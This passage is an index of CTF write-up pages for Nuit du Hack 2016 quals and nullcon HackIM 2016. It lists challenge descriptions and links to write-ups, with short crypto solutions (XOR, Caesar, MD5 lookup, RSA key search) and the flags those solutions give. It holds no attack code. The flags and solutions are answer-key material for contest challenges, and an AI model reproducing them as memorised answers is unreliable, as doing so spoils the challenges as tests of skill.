Maybe the last one will be quite tricky.

Emulating it could be a good idea.

The challenge is available at : http://static.quals.nuitduhack.com/stage1.bin


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/JDIS/write-ups/tree/master/nuitduhack/Matriochka%20-%20Step%201
* http://err0r-451.ru/nuit-du-hack-reverse-matriochka-step-1/
* https://wiki.zenk-security.com/doku.php?id=ndhquals2016:matriochka-step-1
* https://youtu.be/gzxwzbpLn1Q
* https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/matryoshka
* http://vulnerablespace.blogspot.co.uk/2016/04/ctf-writeup-nuit-du-hack-ctf-quals-2016.html
# Nuit du Hack CTF Quals : matriochka-step2-100

**Category:** Crack-Me
**Points:** 100
**Solves:** 232
**Description:**
Can you help me?

Recently, I found an executable binary.

As I'm a true newbie,

Certainly, to solve it, I will have difficulties.

Keep in mind, the first step is quite easy.

Maybe the last one will be quite tricky.

Emulating it could be a good idea.

You must solve step 1 first.


## Write-up

(TODO)

## Other write-ups and resources

* http://hack.carleton.team/2016/05/08/keygenning-with-klee-and-hex-rays/
* http://err0r-451.ru/nuit-du-hack-reverse-matriochka-step-2/
* https://ctftime.org/writeup/3038
* https://youtu.be/xLzAIW_mcMI
* https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/matryoshka
* http://vulnerablespace.blogspot.co.uk/2016/04/ctf-writeup-nuit-du-hack-ctf-quals-2016.html
# Nuit du Hack CTF Quals : matriochka-step3-300

**Category:** Crack-Me
**Points:** 300
**Solves:** 185
**Description:**
Can you help me?

Recently, I found an executable binary.

As I'm a true newbie,

Certainly, to solve it, I will have difficulties.

Keep in mind, the first step is quite easy.

Maybe the last one will be quite tricky.

Emulating it could be a good idea.

You must solve steps 1 and 2 first.


## Write-up

(TODO)

## Other write-ups and resources

* http://maroueneboubakri.blogspot.fr/2016/04/nuit-du-hack-2016-quals-matryoshka3.html
* http://err0r-451.ru/nuit-du-hack-reverse-matriochka-step-3-300pts/
* https://www.youtube.com/watch?v=sqEW3LL-6Pw
* https://github.com/JDIS/write-ups/tree/master/nuitduhack/Matriochka%20-%20Step%203
* https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/matryoshka
* http://vulnerablespace.blogspot.co.uk/2016/04/ctf-writeup-nuit-du-hack-ctf-quals-2016.html
# Nuit du Hack CTF Quals : matriochka-step4-500

**Category:** Crack-Me
**Points:** 500
**Solves:** 51
**Description:**
Can you help me?

Recently, I found an executable binary.

As I'm a true newbie,

Certainly, to solve it, I will have difficulties.

Keep in mind, the first step is quite easy.

Maybe the last one will be quite tricky.

Emulating it could be a good idea.

You must solve steps 1, 2 and 3 first.


## Write-up

(TODO)

## Other write-ups and resources

* http://maroueneboubakri.blogspot.fr/2016/04/nuit-du-hack-2016-quals-matryoshka4.html
* https://securite.intrinsec.com/2016/04/03/write-up-nuit-du-hack-2016-ctf-quals-matriochka-step-4/
* https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/matryoshka
* http://vulnerablespace.blogspot.co.uk/2016/04/ctf-writeup-nuit-du-hack-ctf-quals-2016.html
# Nuit du Hack CTF Quals : mickey-0

**Category:** Crack-Me
**Points:** 0
**Solves:** 0
**Description:**
Well, Nuit du Hack is back at Disneyland for an amazing 2016 edition. Just in case some of you make it to the top by solving all other challenges, here is some thought food for the night.

Of course, this challenge will not change scores or teams qualifications. However, if you solve it, please ping us whenever you are around Paris or during the Nuit du Hack, so we can offer you a drink.

We hope you had much fun this year. See you in July!

The challenge is available at : http://static.quals.nuitduhack.com/mickey/




## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Quals : toil33t

**Category:** Cryptography
**Points:** 400
**Solves:** 65
**Description:**
Hey ! I really want to buy a toil33t, however it is not available yet! :( Can you access to the administrative page and take one for me?

The challenge is available at http://toil33t.quals.nuitduhack.com


## Write-up

(TODO)

## Other write-ups and resources

* https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-cryptography-toil33t/
* https://poisonedbytes.com/files/sp4nky_writeup_CTF_NDH_2016_Quals_Toil33t.txt
* https://github.com/TechSecCTF/writeups/blob/master/NuitDuHack2016/toil33t.md
# Nuit du Hack CTF Quals : crazy-town-famous-350

**Category:** Exploit-Me
**Points:** 350
**Solves:** 4
**Description:**
Here is my city, where we are having a lot of fun. Come and play with us.... :)

The challenge is available at crazytownfamous.quals.nuitduhack.com:55551 The binaries are available at http://static.quals.nuitduhack.com/CrazyTownFamous.tar.gz


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Quals : night-deamonic-heap-400

**Category:** Exploit-Me
**Points:** 400
**Solves:** 4
**Description:**
Welcome to hell my friend! You have to choose a team to fight against the daemon and his minions. You will have to find in his dungeon.

Will you be able to defeat the daemon and find his treasure in /home/my_chall_pwned/flag

Good Luck!

The challenge is available at : nightdaemonicheap.quals.nuitduhack.com:55550 The binaries are available at http://static.quals.nuitduhack.com/role_gaming.tar.gz


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/mingi/ctf/tree/master/nuit%20du%20hack%202016/Night%20Deamonic%20Heap
* https://github.com/ret2libc/ctfs/blob/master/ndh2016/night_deamonic_heap/exp.py
# Nuit du Hack CTF Quals : secure-file-reader-200

**Category:** Exploit-Me
**Points:** 200
**Solves:** 93
**Description:**
Hi, I have secured my file reader so that you won't be able to pwn it. You know, I have pretty good skills in security.

Don't even try to beat me!

The challenge is available at securefilereader.quals.nuitduhack.com:55552 (chall:chall)


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/TeamColonelPanic/write-ups/blob/master/2016/nuit-du-hack-qualifier-2016/exploitation/secure-file-reader/README.md
* http://maroueneboubakri.blogspot.fr/2016/04/nuit-du-hack-quals-secure-file-reader.html
* https://0xabe.io/ctf/exploit/2016/04/03/Nuit-du-Hack-pwn-Secure-File-Reader.html
# Nuit du Hack CTF Quals : catch-me-if-you-can-100

**Category:** Inforensic
**Points:** 100
**Solves:** 50
**Description:**
We managed to infect the computer of a target. We recorded all packets transferred over the USB port, but there is something unusual. We need them to be sorted to get the juicy secret.

The challenge is available at http://static.quals.nuitduhack.com/usb.pcap



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-04-01-nuitduhack-quals/catch_me_if_you_can/README.md
* http://secgroup.github.io/2016/04/04/ndhctf2016-writeup-catchmeifyoucan/
* https://wiki.zenk-security.com/doku.php?id=ndhquals2016:catch-me-if-you-can
* http://duksctf.github.io/NDH2016-catch-me-if-you-can/
# Nuit du Hack CTF Quals : invest-50

**Category:** Inforensic
**Points:** 5-
**Solves:** 70
**Description:**
A paranoid guy seems to have secured his file very well. But I am convinced he made a mistake somewhere...

The challenge is available at : http://static.quals.nuitduhack.com/invest.pcapng


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-04-01-nuitduhack-quals/invest/README.md
* https://www.asafety.fr/vuln-exploit-poc/ctf-ndh-2016-quals-write-up-inforensic-invest/
* http://duksctf.github.io/NDH2016-invest/
* https://github.com/JDIS/write-ups/tree/master/nuitduhack/invest
# Nuit du Hack CTF Quals : keepass-300

**Category:** Inforensic
**Points:** 300
**Solves:** 6
**Description:**
Mr. Huxley has been suspected for every cybercrime we have a law for. LEA agents seized his laptop and made a copy of its RAM while the machine was still active. However, Huxley had hidden inside its laptop an EMP device that was triggered while the agents were trying to seize the hard drive. The drive got destroyed, nothing useful has been found from the RAM dump. Getting at least Huxley's passwords would be very helpful to the agents.

The challenge is available at http://static.quals.nuitduhack.com/memdump.zip


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Quals : trololo-100

**Category:** Inforensic
**Points:** 100
**Solves:** 108
**Description:**
A computer belonging to a new company has been infected by a malware. This is a known version of a cryptolocker software, that uses a irc server to received commands. Let's try to grab its password...

The challenge is available at : http://static.quals.nuitduhack.com/trololo.pcap


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/hexpresso/WU-2016/tree/master/nuit-du-hack-ctf-quals-2016/forensic/Trololo
* http://err0r-451.ru/nuit-du-hack-2016-forensics-trololo-100-pts/
* https://github.com/TechSecCTF/writeups/blob/master/NuitDuHack2016/trololo.md
# Nuit du Hack CTF Quals : who-am-i-150

**Category:** Inforensic
**Points:** 150
**Solves:** 16
**Description:**
Our forensics team has analyzed the cell phone of a bank fraud victim. A hacker managed to steal her money with fraudulent bank transfers. The bank representatives think that the hacker hijacked SMS containing payment tokens, used to verify customer identity prior to sensitive operations. Apparently, the victim bought a second-hand and already rooted (Cyanogen OS) phone on eBay. During the acquisition stage, our team made a bit-wise copy of the internal storage, but something went wrong during the process. After taking the victim cell phone, we made a backup of the internal storage but it hasn't been We need your help to recover the data and find how the intrusion occurred.

The challenge is available at http://static.quals.nuitduhack.com/whoami.zip


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/hexpresso/WU-2016/tree/master/nuit-du-hack-ctf-quals-2016/forensic/WhoAmI
* https://www.youtube.com/watch?v=2783ko3OXdU
# Nuit du Hack CTF Quals write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [webapp/find-me-im-famous-100](webapp/find-me-im-famous-100)
* [webapp/spacesec-300](webapp/spacesec-300)
* [crack-me/matriochka-step1-50](crack-me/matriochka-step1-50)
* [crack-me/matriochka-step2-100](crack-me/matriochka-step2-100)
* [crack-me/matriochka-step3-300](crack-me/matriochka-step3-300)
* [crack-me/matriochka-step4-500](crack-me/matriochka-step4-500)
* [exploit-me/secure-file-reader-200](exploit-me/secure-file-reader-200)
* [exploit-me/night-deamonic-heap-400](exploit-me/night-deamonic-heap-400)
* [inforensic/who-am-i-150](inforensic/who-am-i-150)
* [inforensic/trololo-100](inforensic/trololo-100)
* [inforensic/catch-me-if-you-can-100](inforensic/catch-me-if-you-can-100)
* [inforensic/invest-50](inforensic/invest-50)
* [steganalysis/stegano-sound-150](steganalysis/stegano-sound-150)
* [cryptography/toil33t](cryptography/toil33t)

## Missing write-ups

* [webapp/facesec2-150](webapp/facesec2-150)
* [crack-me/mickey-0](crack-me/mickey-0)
* [exploit-me/crazy-town-famous-350](exploit-me/crazy-town-famous-350)
* [inforensic/keepass-300](inforensic/keepass-300)
* [steganalysis/moleman-500](steganalysis/moleman-500)
# Nuit du Hack CTF Quals : moleman-500

**Category:** Steganalysis
**Points:** 500
**Solves:** 0
**Description:**
Hi, my name is Hans Moleman,

The authorities want to withdraw my license just because "i'm too old".

But for god sake, I'm only 31 years old !

Please Jessie, help me to pass my visual exam.

The flag format is NDH[...]

The challenge is available at : http://static.quals.nuitduhack.com/moleman.png




## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Quals : stegano-sound-150

**Category:** Steganalysis
**Points:** 150
**Solves:** 36
**Description:**
Homer Simpson is being looked after by the cops, following a bank robbery. We intercepted a conversation between him and Marge Simpson, but the quality is very bad. We believe they exchanged about a secret related to some "ndh" event.

The challenge is available at http://static.quals.nuitduhack.com/simpsons.wav


## Write-up

(TODO)

## Other write-ups and resources

* https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-steganalysis-stegano-sound/
* https://www.youtube.com/watch?v=NJLyMSiNgNo
* https://wiki.zenk-security.com/doku.php?id=ndhquals2016:stegano-sound
# Nuit du Hack CTF Quals : facesec2-150

**Category:** Webapp
**Points:** 150
**Solves:** 6
**Description:**
Since last year, facesec company has secured its website. However, the new upload algorithm seems to have another vulnerability. Can you exploit it?

The challenge is available at http://facesec2.quals.nuitduhack.com


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Nuit du Hack CTF Quals : find-me-im-famous-100

**Category:** Webapp
**Points:** 100
**Solves:** 85
**Description:**
Hey Dude! This authentication annoys me, please help!

The challenge is available at http://findmeimfamous.quals.nuitduhack.com




## Write-up

(TODO)

## Other write-ups and resources

* https://www.asafety.fr/vuln-exploit-poc/ctf-ndh-2016-quals-write-up-webapp-find-me-im-famous/
* https://0x90r00t.com/fr/2016/04/04/nuit-du-hack-quals-2016-web-100-find-me-im-famous-write-up/
# Nuit du Hack CTF Quals : spacesec-300

**Category:** Webapp
**Points:** 300
**Solves:** 30
**Description:**
Hi!

I am a security enthusiast, but still learning.

So, if you could help me to improve my website, that would be very cool ;-)

The challenge is available at http://spacesec.quals.nuitduhack.com



## Write-up

(TODO)

## Other write-ups and resources

* https://www.dailysecurity.fr/write-up-ndh-quals-2016-spacesec/
# nullcon HackIM : Crypto Question 1

**Category:** Crypto
**Points:** 500
**Solves:** 
**Description:**

> You are in this GAME. A critical mission, and you are surrounded by the beauties, ready to shed their slik gowns on your beck. On onside your feelings are pulling you apart and another side you are called by the duty. The biggiest question is seX OR success? The signals of subconcious mind are not clear, cryptic. You also have the message of heart which is clear and cryptic. You just need to use three of them and find whats the clear message of your Mind... What you must do?
> 
> 
> [crypto1.zip](./crypto1.zip)


## Write-up

by [steelsoldat](https://github.com/steelsoldat)

From the description it can be deduced that this is probably a XOR challenge. Since we are given the Heartclear and Heartcrypt files XORing the crypt with the plaintext gives us the following key:

```
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you are looking for.
Its right there what you a
```

While it is beyond creepy we can then xor Mindcrypt with the key and get the following

```
https://play.google.com/store/apps/collection/promotion_3001629_watch_live_games?hl=en
ithjo(qs1ob+Z>q3y.)lyf1"vU#npdS.ie7;ZS6D9
                                         hFhspu;-5alby*a*6q$;1s"6<zv~+$.ytho~p7?Gsi/vsmw~tjojYvi(,w'kC8x;mqS"b9l[|!
to5s6h0l-a12zoqvaz/ym1:{z7#,|1S5woxjp%0^Kr
oujp~(rs5i'rB#0&S
```

And with the risky click of the day we visit the link and see the following header **Never Miss a Game** which is our flag.

## Other write-ups and resources

* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-1-500-points/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_1#eng-version>
* <https://www.xil.se/post/hackim-2016-crypto-1-arturo182/>
* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-1/>
* <http://www.cnblogs.com/Christmas/p/5176496.html>
* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/crypto%201/crypto_1.md>
* <https://github.com/Desiprox/NullCon-2016/tree/master/crypto_1>
* <https://0x90r00t.com/2016/02/03/hackim-2016crypto-500-crypto-question-1-write-up/>
* <http://err0r-451.ru/hackim-crypto-question-1/>
# nullcon HackIM : Crypto Question 2

**Category:** Crypto
**Points:** 400
**Solves:** 
**Description:**

> Some one was here, some one had breached the security and had infiltrated here. All the evidences are touched, Logs are altered, records are modified with key as a text from book.The Operation was as smooth as CAESAR had Conquested Gaul. After analysing the evidence we have some extracts of texts in a file. We need the title of the book back, but unfortunately we only have a portion of it...
> 
> 
> [The_extract.txt](./The_extract.txt)


## Write-up

by [steelsoldat](https://github.com/steelsoldat)

After reading the description it was pretty clear this was a Caesar cipher. Upon throwing 'The_extract.txt' into [Xarg's Caesar decrypter](http://www.xarg.org/tools/caesar-cipher/) we can recover what seems like an [excerpt from a book](./The_text.txt)(which would match the problem description). 

Afterwards we can throw the first sentence of the plaintext into Google Books, where we are met with multiple books, but the first result 'In the Shadow of Greed' is the correct flag!

## Other write-ups and resources

* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-2-400-points/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_2#eng-version>
* <https://www.xil.se/post/hackim-2016-crypto-2-arturo182/>
* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-2/>
* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/crypto_2/crypto_2.md>
* <https://github.com/Desiprox/NullCon-2016/tree/master/crypto_2>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176509.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016crypto-400-crypto-question-2-write-up/>
* <http://err0r-451.ru/hackim-crypto-question-2-400pts/>
# nullcon HackIM : Crypto Question 3

**Category:** Crypto
**Points:** 400
**Solves:** 
**Description:**

> After entring the luxurious condomium,you get the feel that you are in home of a yester Star. the extravagant flooring and furnishings shows the richness of this star. But where is she? There she is, lying peacefuly on her couch. See what Envy has done to her...with a perfectly well maintained attractive body she still looks sex diva, except for her face beyond recogniton. Her identity is crucial to know who killed her and why? In absence of any personal data around there is only a file. with a cryptic text in it. Preity sure she has used her own name to XOR encrypt the file. And challenge is to know her name.
> 
> 
> [AncientSecretsOfTheKamaSutra.txt](./AncientSecretsOfTheKamaSutra.txt)


## Write-up

by [steelsoldat](https://github.com/steelsoldat)

Crypto 3: We're given a text file that we can't read 'AncientSecretsOfTheKamaSutra.txt'

Upon googling the name of the text file we *come* up with a 1997 Adult Film.
The hints tell us someone was dead over a couch, but luckily you dont need to watch the porno to find out if that is a scene in the film.

I began xoring the contents of the text file with various star names(first with in-film names) then converting the reverting hex to ascii

Upon xoring with 'Jeanna Fine' we get a huge block of hex

```
a5dadc7e636b274d282f4d476f2f58104e33422073241946702067020ca9d6d324476f606a3d496e5c2c0340466a68207b29030f706a1620746865792077616e74203440246d652361124762720f184a657b2f3a4886d1d86762607c44432d4c7f207f43205e27636b2422036a60476f2f6221552c086d0a4b0f747a726a8e9ffb5f6b6e4e1c5e796a2f214986d1d878646a62160b36427f2068402c41622e2479632c7b63417d8ed1d3402608780b0f5b6c6a20636b6962726172390f7367657d24a9d6d3574b6e7d44568e9ffb86d1d8476f2f81d1dccff9d44a634b6b4b45696f3b5c282f4d476f6681d1dc44782c7c6e476f722b5c7b6e4b63020f5b6c6a2044200b4e27581a74728ed1d3236e433c5a8af5d88ed1d3630a7e86d1d8a5dadc6364662f010f7363a5dadc1d04712f4186d1d85f204973696c2a2242676840722f792754cff9d4742021416766658e9ffb7c81daf76a6663646d4b2c7b676e56618ed1d353214d754442a5dadc6a742fcff9d481daf74e8ed1d37c313e4678770a2b54264d28234a1050724e787c2f2952cff9d4636fa5dadc17044e34446e6a8af5d84669636b651f5781daf7726a2081de9d084b277fa5dadc05476c2a4274207002466520400a074228537e5f374627738e9ffb00568af5d87473208e9ffb274c2c488aded3054f360773686107037c6f2b060b4d71207b476f204b627c653b4b81daf7766a207b29035627660a6574206d616e7920706568401f4781d1dc615f6f608af5d8577561675e656f81daf767637681de9d74656163280f70676562610b4e69720f0244796a2f05a9d6d3286d2c5c7e1059240774656718467c73258e9ffb0e2b535662743a4d666e411a044a4e6a8ed1d36e612046696e250f0e
```

that turns into the following ASCII
```
¥ÚÜ~ck'M(/MGo/XN3B s$Fp g©ÖÓ$Go`j=In\,@Fjh {)pj they want 4@$me#aGbrJe{/:HÑØgb`|DC-L C ^'ck$"j`Go/b!U,m
Ktzrjû_knN^yj/!IÑØxdjb6B h@,Ab.$yc,{cA}ÑÓ@&x[lj ckibrar9sge}$©ÖÓWKn}DVûÑØGo/ÑÜÏùÔJcKkKEio;\(/MGofÑÜDx,|nGor+\{nKc[lj D N'XtrÑÓ#nC<ZõØÑÓc
~ÑØ¥ÚÜcdf/sc¥ÚÜq/AÑØ_ Isil*"Bgh@r/y'TÏùÔt !Agfeû|Ú÷jfcdmK,{gnVaÑÓS!MuDB¥ÚÜjt/ÏùÔÚ÷NÑÓ|1>Fxw
+T&M(#JPrNx|/)RÏùÔco¥ÚÜN4DnjõØFickeWÚ÷rj ÞK'¥ÚÜGl*Bt pFe @
```
'they want me' is in that output, so 'Jeanna Fine' is the flag.

## Other write-ups and resources

* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-3-400-points/>
* <https://www.xil.se/post/hackim-2016-crypto-3-arturo182/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/crypto-3.md#nullcon-hackim-crypto-question-3>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176542.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016crypto-400-crypto-question-3-write-up/>
# nullcon HackIM : Crypto Question 4

**Category:** Crypto
**Points:** 200
**Solves:** 
**Description:**

> He is influential, he is powerful. He is your next contact you can get you out of this situation. You must reach him soon. Who is he? The few pointers intrecpted by KGB are in the file. Once we know him, we can find his most valuable possession, his PRIDE.
> 
> 
> [whatsHisPride.md5s](./whatsHisPride.md5s)


## Write-up

by [steelsoldat](https://github.com/steelsoldat)

Opening the file attatched leads to a list of MD5 hashes. After running them through a rainbow table they come out to the following
* d80517c8069d7702d8fdd89b64b4ed3b : Carrie
* 088aed904b5a278342bba6ff55d0b3a8 : Grease
* 56cdd7e9e3cef1974f4075c03a80332d : Perfect
* 0a6de9d8668281593bbd349ef75c1f49 : Shout
* 972e73b7a882d0802a4e3a16946a2f94 : Basic
* 1cc84619677de81ee6e44149845270a3 : Actor
* b95086a92ffcac73f9c828876a8366f0 : Aircraft
* b068931cc450442b63f5b3d276ea4297 : name

After we take those words and plug them into Google the first result is John Travolta, which matches the problem description of an influential man. Next we need to find out what his PRIDE is. The terms all seemed to be related to his acting career other than the last two words: Aircraft, and name.

Looking at his [Wikipdea page](https://en.wikipedia.org/wiki/John_Travolta) we can see he does own a plane, which has a name. *"He owns five aircraft, including an ex-Qantas Boeing 707-138 airliner that bears the name Jett Clipper Ella in honor of his children"*

The name of his aircraft is the flag! Jett Clipper Ella

## Other write-ups and resources

* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-4-200-points/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_4#eng-version>
* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-4/>
* <http://err0r-451.ru/hackim-crypto-question-4-200pts/>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176564.html)
# nullcon HackIM : Crypto Question 5

**Category:** Crypto
**Points:** 500
**Solves:** 
**Description:**

> Now you are one step away from knowing who is that WARRIOR. The Fighter who will decide the fate of war between the 2 countries. The Pride of One and Envey of the Other... You have got the secrete file which has the crucial information to identify the fighter. But the file is encrypted with a RSA-Private key. Good news you have its corresponding public key in a file. Bad news there are 49 other keys. Whos is the Fighter.
> 
> 
> [crypto5.zip](./crypto5.zip)


## Write-up

by [unicornasfuel](https://github.com/unicornsasfuel)

crypto5.zip contains two files: `warrior.txt` and `all_keys.txt`.

The keys are all RSA public keys, in ASCII-armored format. They are all the same keylength, and as such occupy the same number of lines in the file per key, making it easy to carve out each key. As there are only 50 keys, we can use an exhaustive search method to determine which is the correct key, attempting to decrypt the ciphertext with each one.

While we would normally apply a plaintext scoring system to programmatically determine which is the most likely candidate for successful decryption, there are so few keys that we can simply spit out all the candidate decryptions and then scroll through them until we see text.

Several challengers were confused about the statement that the message was encrypted with the private key, being under the impression that private keys cannot be used to encrypt under RSA. In reality, either key in a keypair can be used as the private or public component. Since the encryption and decryption operations do not differ except in the use of the other half of the keypair, we can use standard libraries to "encrypt" the data with each public key in order to decrypt it.

We can use Python and PyCrypto to solve the puzzle, like so:

~~~Python
from Crypto.PublicKey import RSA

ciphertext_fh = open('warrior.txt','r')
ciphertext = ciphertext_fh.read()
ciphertext_fh.close()

key_fh = open('all_keys.txt','r')
key = ''
for line_counter in range(9):
   key += key_fh.readline()

while key != '':
   cipher = RSA.importKey(key)
   print repr(cipher.encrypt(ciphertext, 'dummy')) # dummy second argument for compatibility
   key = ''
   for line_counter in range(9):
      key += key_fh.readline()
~~~

We search through the resulting outputs for the word "the", and find a properly padded decrypted message:

~~~
("\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00This fighter is a designation for two separate, heavily upgraded derivatives of the Su-35 'Flanker' jet plane. They are single-seaters designed by Sukhoi(KnAAPO).\n",)
~~~

Googling for this text results in a Wikipedia page on a fighter jet at https://en.wikipedia.org/wiki/Sukhoi_Su-35.

The flag is the name of the fighter jet: `Sukhoi Su-35`

## Other write-ups and resources

* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-5-500-points/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_5#eng-version>
* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-5/>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176600.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016crypto-500-crypto-question-5-write-up/>
# nullcon HackIM : Exploitation Question 1

**Category:** Exploitation
**Points:** 100
**Solves:** 
**Description:**

> 52.72.171.221:9981
> 
> 
> [exp1_a505bbfdaf02bb7380a4ec7294a643df_pinkfloyd.tar.gz](./exp1_a505bbfdaf02bb7380a4ec7294a643df_pinkfloyd.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/hackim-ctf-exploitation-100-pinkfloyd.html>
* <https://github.com/nongiach/WriteUp_pinkfloyd_HackIM2016>
* <http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/>
* <https://gist.github.com/ocean1/8a518a0898dd76087361>
# nullcon HackIM : Exploitation Question 2

**Category:** Exploitation
**Points:** 200
**Solves:**
**Description:**

> 52.72.171.221:9982
>
>
> [exp2_94421d1cf4a6c265bafcb286d73dd1b7_sandman.tar.gz](./exp2_94421d1cf4a6c265bafcb286d73dd1b7_sandman.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* [http://boaster.github.io/exploitation/2016/01/31/HackIM-CTF-Sandman-Exploitation-200.html](http://boaster.github.io/exploitation/2016/01/31/HackIM-CTF-Sandman-Exploitation-200.html)
* <http://mashirogod.github.io/blog/2016/01/31/2016-nullcon-pwn-200/>
* <http://losfuzzys.github.io/writeup/2016/02/02/hackim2016-sandman200/>
* <http://gnoobz.com/hackim-ctf-exploitation-200-sandman.html>
# nullcon HackIM : Exploitation Question 3

**Category:** Exploitation
**Points:** 300
**Solves:** 
**Description:**

> 52.72.171.221:9983
> 
> 
> [exp3_a0b6613127234a9660be46fe0ebc7951_cman.tar.gz](./exp3_a0b6613127234a9660be46fe0ebc7951_cman.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/hackim-ctf-exploitation-300-cman.html>
# nullcon HackIM : Exploitation Question 4

**Category:** Exploitation
**Points:** 400
**Solves:** 
**Description:**

> <52.72.171.221:9984>
>
>
>
> [exp4_9c8b080a40b434b618a7aa46aca43051_hotmail.tar.gz](./exp4_9c8b080a40b434b618a7aa46aca43051_hotmail.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM : CatchMeIfYouCan

**Category:** Forensics
**Points:** 100
**Solves:** 
**Description:**

> We got this log which is highly compressed. Find the intruder's secret.
> 
> 
> [f100](https://mega.nz/#!CI8imZQR)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-01-30-nullcon-hackim/forensics_100_catch_me_if_you_can>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/forensics_1#eng-version>
# nullcon HackIM : File and Folders

**Category:** Forensics
**Points:** 500
**Solves:** 
**Description:**

> Find the hidden secret 
>
> Note: Forensics500 challenge file has been updated, Please redownload
>
> [f500 == mem.img.zip](https://mega.nz/#!KE8RDJAR)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM : Payload Delivers Fantastic

**Category:** Forensics
**Points:** 300
**Solves:** 
**Description:**

> Analyze these files and find the key.
> 
> 
> [f300](./f300)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM : PeepingTom

**Category:** Forensics
**Points:** 400
**Solves:** 
**Description:**

> We have recovered a network capture and screen log of a suspect. However the connection got terminated before the final message was about to be printed. Can you help us recover the final message ?
> 
> 
> [f400](./f400.rar)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM : SculptMe

**Category:** Forensics
**Points:** 200
**Solves:** 
**Description:**

> Recover the hidden data.
> 
> 
> [f200](https://mega.nz/#!6R9mXbxC)


## Write-up

(TODO)

## Other write-ups and resources

* <https://medium.com/guilty-spork/hackim-forensics-200-4748bd2bc085#.kor8jy5vv>
* <http://ctfwriteups.blogspot.in/2016/02/ackim-2016-forensics-200.html>
# nullcon HackIM : Calligraphy

**Category:** Misc
**Points:** 100
**Solves:** 
**Description:**

> Classic challenge all I can say!!!
> 
> 
> [m100](./m100)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM : Hiding In Plain Sight.

**Category:** Misc
**Points:** 200
**Solves:** 
**Description:**

> Find out the secret key hidden in these packets!
> 
> 
> [m200-HiPs.rar](./m200-HiPs.rar)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-01-30-nullcon-hackim/misc_200_hiding_in_plain_sight>
* <https://www.xil.se/post/hackim-2016-misc-2-arturo182/>
# nullcon HackIM : Know India

**Category:** Misc
**Points:** 300
**Solves:** 
**Description:**

> How well you know about India?
> 
> 
> 52.91.163.151:10101


## Write-up

(TODO)

